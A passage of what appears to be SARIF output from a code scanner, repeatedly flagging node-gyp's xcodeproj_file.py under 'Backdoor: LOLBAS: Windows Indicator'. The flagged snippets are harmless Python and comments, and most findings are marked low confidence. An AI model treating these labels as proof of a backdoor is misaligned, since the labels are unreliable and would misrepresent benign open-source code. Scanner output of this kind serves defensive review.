                    "text": "                        \"--target-device\",\n                        \"ipad\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n            else:\n",
                    "rendered": {
                      "text": "                        \"--target-device\",\n                        \"ipad\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n            else:\n",
                      "markdown": "`                        \"--target-device\",\n                        \"ipad\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n            else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3145,
                  "startColumn": 41,
                  "endLine": 3145,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    def ComputeIDs(self, recursive=True, overwrite=True, hash=None):\n        # Although XCProjectFile is implemented here as an XCObject, it's not a\n        # proper object in the Xcode sense, and it certainly doesn't have its own\n        # ID.  Pass through an attempt to update IDs to the real root object.\n        if recursive:\n            self._properties[\"rootObject\"].ComputeIDs(recursive, overwrite, hash)\n\n",
                    "rendered": {
                      "text": "    def ComputeIDs(self, recursive=True, overwrite=True, hash=None):\n        # Although XCProjectFile is implemented here as an XCObject, it's not a\n        # proper object in the Xcode sense, and it certainly doesn't have its own\n        # ID.  Pass through an attempt to update IDs to the real root object.\n        if recursive:\n            self._properties[\"rootObject\"].ComputeIDs(recursive, overwrite, hash)\n\n",
                      "markdown": "`    def ComputeIDs(self, recursive=True, overwrite=True, hash=None):\n        # Although XCProjectFile is implemented here as an XCObject, it's not a\n        # proper object in the Xcode sense, and it certainly doesn't have its own\n        # ID.  Pass through an attempt to update IDs to the real root object.\n        if recursive:\n            self._properties[\"rootObject\"].ComputeIDs(recursive, overwrite, hash)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3059,
                  "startColumn": 46,
                  "endLine": 3059,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        # TODO(mark): This only adds references to products in other_pbxproject\n        # when they don't exist in this pbxproject.  Perhaps it should also\n        # remove references from this pbxproject that are no longer present in\n        # other_pbxproject.  Perhaps it should update various properties if they\n        # change.\n        for target in other_pbxproject._properties[\"targets\"]:\n            if not isinstance(target, PBXNativeTarget):\n",
                    "rendered": {
                      "text": "        # TODO(mark): This only adds references to products in other_pbxproject\n        # when they don't exist in this pbxproject.  Perhaps it should also\n        # remove references from this pbxproject that are no longer present in\n        # other_pbxproject.  Perhaps it should update various properties if they\n        # change.\n        for target in other_pbxproject._properties[\"targets\"]:\n            if not isinstance(target, PBXNativeTarget):\n",
                      "markdown": "`        # TODO(mark): This only adds references to products in other_pbxproject\n        # when they don't exist in this pbxproject.  Perhaps it should also\n        # remove references from this pbxproject that are no longer present in\n        # other_pbxproject.  Perhaps it should update various properties if they\n        # change.\n        for target in other_pbxproject._properties[\"targets\"]:\n            if not isinstance(target, PBXNativeTarget):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2322,
                  "startColumn": 31,
                  "endLine": 2322,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    # to allow PBXProject to be used in the remoteGlobalIDString property of\n    # PBXContainerItemProxy.\n    #\n    # Setting a \"name\" property at instantiation may also affect \"productName\",\n    # which may in turn affect the \"PRODUCT_NAME\" build setting in children of\n    # \"buildConfigurationList\".  See __init__ below.\n    _schema = XCRemoteObject._schema.copy()\n",
                    "rendered": {
                      "text": "    # to allow PBXProject to be used in the remoteGlobalIDString property of\n    # PBXContainerItemProxy.\n    #\n    # Setting a \"name\" property at instantiation may also affect \"productName\",\n    # which may in turn affect the \"PRODUCT_NAME\" build setting in children of\n    # \"buildConfigurationList\".  See __init__ below.\n    _schema = XCRemoteObject._schema.copy()\n",
                      "markdown": "`    # to allow PBXProject to be used in the remoteGlobalIDString property of\n    # PBXContainerItemProxy.\n    #\n    # Setting a \"name\" property at instantiation may also affect \"productName\",\n    # which may in turn affect the \"PRODUCT_NAME\" build setting in children of\n    # \"buildConfigurationList\".  See __init__ below.\n    _schema = XCRemoteObject._schema.copy()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2291,
                  "startColumn": 52,
                  "endLine": 2291,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n",
                    "rendered": {
                      "text": "\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n",
                      "markdown": "`\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2279,
                  "startColumn": 5,
                  "endLine": 2279,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    # a real way to do forward declarations.  To work around, the type of\n    # the \"target\" property is reset below, after XCTarget is defined.\n    #\n    # At least one of \"name\" and \"target\" is required.\n    _schema = XCObject._schema.copy()\n    _schema.update(\n        {\n",
                    "rendered": {
                      "text": "    # a real way to do forward declarations.  To work around, the type of\n    # the \"target\" property is reset below, after XCTarget is defined.\n    #\n    # At least one of \"name\" and \"target\" is required.\n    _schema = XCObject._schema.copy()\n    _schema.update(\n        {\n",
                      "markdown": "`    # a real way to do forward declarations.  To work around, the type of\n    # the \"target\" property is reset below, after XCTarget is defined.\n    #\n    # At least one of \"name\" and \"target\" is required.\n    _schema = XCObject._schema.copy()\n    _schema.update(\n        {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2254,
                  "startColumn": 52,
                  "endLine": 2254,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    def __repr__(self):\n        props = self._properties\n        name = \"{}.gyp:{}\".format(props[\"containerPortal\"].Name(), props[\"remoteInfo\"])\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n",
                    "rendered": {
                      "text": "    def __repr__(self):\n        props = self._properties\n        name = \"{}.gyp:{}\".format(props[\"containerPortal\"].Name(), props[\"remoteInfo\"])\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n",
                      "markdown": "`    def __repr__(self):\n        props = self._properties\n        name = \"{}.gyp:{}\".format(props[\"containerPortal\"].Name(), props[\"remoteInfo\"])\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n        # Admittedly not the best name, but it's what Xcode uses.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2237,
                  "startColumn": 69,
                  "endLine": 2237,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    # Xcode is weird about remoteGlobalIDString.  Usually, it's printed without\n    # a comment, indicating that it's tracked internally simply as a string, but\n    # sometimes it's printed with a comment (usually when the object is initially\n    # created), indicating that it's tracked as a project file object at least\n    # sometimes.  This module always tracks it as an object, but contains a hack\n    # to prevent it from printing the comment in the project file output.  See\n    # _XCKVPrint.\n",
                    "rendered": {
                      "text": "    # Xcode is weird about remoteGlobalIDString.  Usually, it's printed without\n    # a comment, indicating that it's tracked internally simply as a string, but\n    # sometimes it's printed with a comment (usually when the object is initially\n    # created), indicating that it's tracked as a project file object at least\n    # sometimes.  This module always tracks it as an object, but contains a hack\n    # to prevent it from printing the comment in the project file output.  See\n    # _XCKVPrint.\n",
                      "markdown": "`    # Xcode is weird about remoteGlobalIDString.  Usually, it's printed without\n    # a comment, indicating that it's tracked internally simply as a string, but\n    # sometimes it's printed with a comment (usually when the object is initially\n    # created), indicating that it's tracked as a project file object at least\n    # sometimes.  This module always tracks it as an object, but contains a hack\n    # to prevent it from printing the comment in the project file output.  See\n    # _XCKVPrint.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1424,
                  "startColumn": 9,
                  "endLine": 1424,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n\n        # At this stage, check that child class types are PBXGroup exactly,\n        # instead of using isinstance.  The only subclass of PBXGroup,\n        # PBXVariantGroup, should not participate in reparenting in the same way:\n        # reparenting by merging different object types would be wrong.\n",
                    "rendered": {
                      "text": "    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n\n        # At this stage, check that child class types are PBXGroup exactly,\n        # instead of using isinstance.  The only subclass of PBXGroup,\n        # PBXVariantGroup, should not participate in reparenting in the same way:\n        # reparenting by merging different object types would be wrong.\n",
                      "markdown": "`    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n\n        # At this stage, check that child class types are PBXGroup exactly,\n        # instead of using isinstance.  The only subclass of PBXGroup,\n        # PBXVariantGroup, should not participate in reparenting in the same way:\n        # reparenting by merging different object types would be wrong.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1419,
                  "startColumn": 35,
                  "endLine": 1419,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n    If recurse is True, this function will recurse into children and ask them\n    to collapse themselves by taking over only children as well.  Assuming\n    an example hierarchy with files at a/b/c/d1, a/b/c/d2, and a/b/c/d3/e/f\n    (d1, d2, and f are files, the rest are groups), recursion will result in\n    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n    If recurse is True, this function will recurse into children and ask them\n    to collapse themselves by taking over only children as well.  Assuming\n    an example hierarchy with files at a/b/c/d1, a/b/c/d2, and a/b/c/d3/e/f\n    (d1, d2, and f are files, the rest are groups), recursion will result in\n    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n",
                      "markdown": "`\n    If recurse is True, this function will recurse into children and ask them\n    to collapse themselves by taking over only children as well.  Assuming\n    an example hierarchy with files at a/b/c/d1, a/b/c/d2, and a/b/c/d3/e/f\n    (d1, d2, and f are files, the rest are groups), recursion will result in\n    a group for a/b/c containing a group for d3/e.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 572,
                  "startColumn": 47,
                  "endLine": 572,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n",
                    "rendered": {
                      "text": "        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n",
                      "markdown": "`        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 512,
                  "startColumn": 48,
                  "endLine": 512,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        return descendants\n\n    def PBXProjectAncestor(self):\n        # The base case for recursion is defined at PBXProject.PBXProjectAncestor.\n        if self.parent:\n            return self.parent.PBXProjectAncestor()\n        return None\n",
                    "rendered": {
                      "text": "        return descendants\n\n    def PBXProjectAncestor(self):\n        # The base case for recursion is defined at PBXProject.PBXProjectAncestor.\n        if self.parent:\n            return self.parent.PBXProjectAncestor()\n        return None\n",
                      "markdown": "`        return descendants\n\n    def PBXProjectAncestor(self):\n        # The base case for recursion is defined at PBXProject.PBXProjectAncestor.\n        if self.parent:\n            return self.parent.PBXProjectAncestor()\n        return None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 411,
                  "startColumn": 65,
                  "endLine": 411,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    such, it is only advisable to call ComputeIDs once an entire project file\n    tree is built.\n\n    If recursive is True, recurse into all descendant objects and update their\n    hashes.\n\n    If overwrite is True, any existing value set in the \"id\" property will be\n",
                    "rendered": {
                      "text": "    such, it is only advisable to call ComputeIDs once an entire project file\n    tree is built.\n\n    If recursive is True, recurse into all descendant objects and update their\n    hashes.\n\n    If overwrite is True, any existing value set in the \"id\" property will be\n",
                      "markdown": "`    such, it is only advisable to call ComputeIDs once an entire project file\n    tree is built.\n\n    If recursive is True, recurse into all descendant objects and update their\n    hashes.\n\n    If overwrite is True, any existing value set in the \"id\" property will be\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 52,
                  "endLine": 303,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n        \"\"\"Make a copy of this object.\n",
                    "rendered": {
                      "text": "            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n        \"\"\"Make a copy of this object.\n",
                      "markdown": "`            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n        \"\"\"Make a copy of this object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 302,
                  "startColumn": 47,
                  "endLine": 302,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        try:\n            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n",
                    "rendered": {
                      "text": "        try:\n            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n",
                      "markdown": "`        try:\n            name = self.Name()\n        except NotImplementedError:\n            return f\"<{self.__class__.__name__} at 0x{id(self):x}>\"\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Copy(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 41,
                  "endLine": 259,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  Attributes:\n    id: The object's identifier, a 24-character uppercase hexadecimal string.\n        Usually, objects being created should not set id until the entire\n        project file structure is built.  At that point, UpdateIDs() should\n        be called on the root object to assign deterministic values for id to\n        each object in the tree.\n    parent: The object's parent.  This is set by a parent XCObject when a child\n",
                    "rendered": {
                      "text": "  Attributes:\n    id: The object's identifier, a 24-character uppercase hexadecimal string.\n        Usually, objects being created should not set id until the entire\n        project file structure is built.  At that point, UpdateIDs() should\n        be called on the root object to assign deterministic values for id to\n        each object in the tree.\n    parent: The object's parent.  This is set by a parent XCObject when a child\n",
                      "markdown": "`  Attributes:\n    id: The object's identifier, a 24-character uppercase hexadecimal string.\n        Usually, objects being created should not set id until the entire\n        project file structure is built.  At that point, UpdateIDs() should\n        be called on the root object to assign deterministic values for id to\n        each object in the tree.\n    parent: The object's parent.  This is set by a parent XCObject when a child\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 49,
                  "endLine": 98,
                  "endColumn": 58,
                  "snippet": {
                    "text": "identifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\nmitigate this problem, this module chooses identifiers in a more deterministic\nway, by hashing a description of each object as well as its parent and ancestor\nobjects.  This strategy should result in minimal \"shift\" in IDs as successive\n",
                    "rendered": {
                      "text": "identifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\nmitigate this problem, this module chooses identifiers in a more deterministic\nway, by hashing a description of each object as well as its parent and ancestor\nobjects.  This strategy should result in minimal \"shift\" in IDs as successive\n",
                      "markdown": "`identifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\nmitigate this problem, this module chooses identifiers in a more deterministic\nway, by hashing a description of each object as well as its parent and ancestor\nobjects.  This strategy should result in minimal \"shift\" in IDs as successive\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 30,
                  "endLine": 92,
                  "endColumn": 34,
                  "snippet": {
                    "text": "which is not duplicated here.  Because the identifier only is only generated\nonce, when an object is created, and is then left unchanged, there is no need\nto attempt to duplicate Xcode's behavior in this area.  The generator is free\nto select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\n",
                    "rendered": {
                      "text": "which is not duplicated here.  Because the identifier only is only generated\nonce, when an object is created, and is then left unchanged, there is no need\nto attempt to duplicate Xcode's behavior in this area.  The generator is free\nto select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\n",
                      "markdown": "`which is not duplicated here.  Because the identifier only is only generated\nonce, when an object is created, and is then left unchanged, there is no need\nto attempt to duplicate Xcode's behavior in this area.  The generator is free\nto select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 42,
                  "endLine": 83,
                  "endColumn": 51,
                  "snippet": {
                    "text": "When a project is open in the Xcode application, Xcode will rewrite it.  As\nsuch, this module is careful to adhere to the formatting used by Xcode, to\navoid insignificant changes appearing in the file when it is used in the\nXcode application.  This will keep version control repositories happy, and\nmakes it possible to compare a project file used in Xcode to one generated by\nthis module to determine if any significant changes were made in the\napplication.\n",
                    "rendered": {
                      "text": "When a project is open in the Xcode application, Xcode will rewrite it.  As\nsuch, this module is careful to adhere to the formatting used by Xcode, to\navoid insignificant changes appearing in the file when it is used in the\nXcode application.  This will keep version control repositories happy, and\nmakes it possible to compare a project file used in Xcode to one generated by\nthis module to determine if any significant changes were made in the\napplication.\n",
                      "markdown": "`When a project is open in the Xcode application, Xcode will rewrite it.  As\nsuch, this module is careful to adhere to the formatting used by Xcode, to\navoid insignificant changes appearing in the file when it is used in the\nXcode application.  This will keep version control repositories happy, and\nmakes it possible to compare a project file used in Xcode to one generated by\nthis module to determine if any significant changes were made in the\napplication.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 57,
                  "endLine": 57,
                  "endColumn": 61,
                  "snippet": {
                    "text": "objects dictionary.\n\nIn Xcode, every file used as input to a target or produced as a final product\nof a target must appear somewhere in the hierarchy rooted at the PBXGroup\nobject referenced by the PBXProject's mainGroup property.  A PBXGroup is\ngenerally represented as a folder in the Xcode application.  PBXGroups can\ncontain other PBXGroups as well as PBXFileReferences, which are pointers to\n",
                    "rendered": {
                      "text": "objects dictionary.\n\nIn Xcode, every file used as input to a target or produced as a final product\nof a target must appear somewhere in the hierarchy rooted at the PBXGroup\nobject referenced by the PBXProject's mainGroup property.  A PBXGroup is\ngenerally represented as a folder in the Xcode application.  PBXGroups can\ncontain other PBXGroups as well as PBXFileReferences, which are pointers to\n",
                      "markdown": "`objects dictionary.\n\nIn Xcode, every file used as input to a target or produced as a final product\nof a target must appear somewhere in the hierarchy rooted at the PBXGroup\nobject referenced by the PBXProject's mainGroup property.  A PBXGroup is\ngenerally represented as a folder in the Xcode application.  PBXGroups can\ncontain other PBXGroups as well as PBXFileReferences, which are pointers to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
